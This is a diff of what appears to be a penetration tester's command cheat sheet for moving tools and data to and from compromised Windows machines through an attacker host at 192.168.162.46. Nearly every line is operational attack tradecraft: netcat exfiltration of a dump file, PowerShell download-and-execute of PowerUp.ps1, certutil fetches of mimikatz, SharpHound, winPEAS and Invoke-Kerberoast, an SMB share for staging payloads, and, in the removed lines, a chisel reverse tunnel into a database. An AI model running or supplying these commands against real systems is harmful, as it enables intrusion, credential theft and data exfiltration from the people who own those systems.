@@ -1,5 +1,34 @@
+---------------------
+nc -nvlp 443 > secret.dmp
+nc -w3 -nv 192.168.162.46 443 < secret.dmp
+
+---------------------
+cd ~\tools\privesc_windows
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support
+cd C:\windows\temp\
+copy \\192.168.162.46\share\*
+
+---------------------
+nc -nvlp 80
+powershell.exe (New-Object System.Net.WebClient).Downloadfile('http://192.168.162.46/rev.exe','rev.exe')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.162.46/PowerUp.ps1')
+
+---------------------
+cd ~\tools\privesc_windows
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+certutil -urlcache -split -f http://192.168.162.46:80/nc.exe
+certutil -urlcache -split -f http://192.168.162.46:80/chisel.exe
+certutil -urlcache -split -f http://192.168.162.46:80/chisel-amd64.exe 
+certutil -urlcache -split -f http://192.168.162.46:80/mimikatz_64.exe
+certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1
+certutil -urlcache -split -f http://192.168.162.46:80/SharpHound.exe
+certutil -urlcache -split -f http://192.168.162.46:80/winPEASx64.exe
+certutil -urlcache -split -f http://192.168.162.46:80/Invoke-Kerberoast.ps1
+
+---------------------
 sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib -p 21 -u mike -P paxx -w
+sudo python3 -m pyftpdlib -p 21 -u mike -P helps -w
 ftp 192.168.162.46
 user mike helps
 passive
@@ -10,31 +39,5 @@ binary
 GET mimikatz_64.exe
 bye
 
-nc -nvlp 443 > secret.dmp
-nc -w3 -nv 192.168.162.46 443 < secret.dmp
-
-cd ~\tools\privesc_windows
-smbup
-smbup -smb2support
-cd C:\windows\temp\
-copy \\192.168.162.46\share\*
-
-nc -nvlp 80
-powershell.exe (New-Object System.Net.WebClient).Downloadfile('http://192.168.162.46/rev.exe','rev.exe')
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.162.46/PowerUp.ps1')
-
-webup80
-python2 -m SimpleHTTPServer 80
-python3 -m http.server 80
-smbup
-copy \\192.168.162.46\share\*
-certutil -urlcache -split -f http://192.168.162.46:8080/chisel.exe
-certutil -urlcache -split -f http://192.168.162.46:8080/mimikatz_64.exe
-certutil -urlcache -split -f http://192.168.162.46:8080/PowerUp.ps1
-certutil -urlcache -split -f http://192.168.162.46:8080/SharpHound.exe
-certutil -urlcache -split -f http://192.168.162.46:8080/winPEASx64.exe
-certutil -urlcache -split -f http://192.168.162.46:8080/Invoke-Kerberoast.ps1
-
-chisel server -p 80 -reverse -v
-chisel client kali:80 R:127.0.0.1:3306:box2:3306
-mysql --host=127.0.0.1 --port=3306 --user=root -p
+---------------------
+Consider: mxpivot
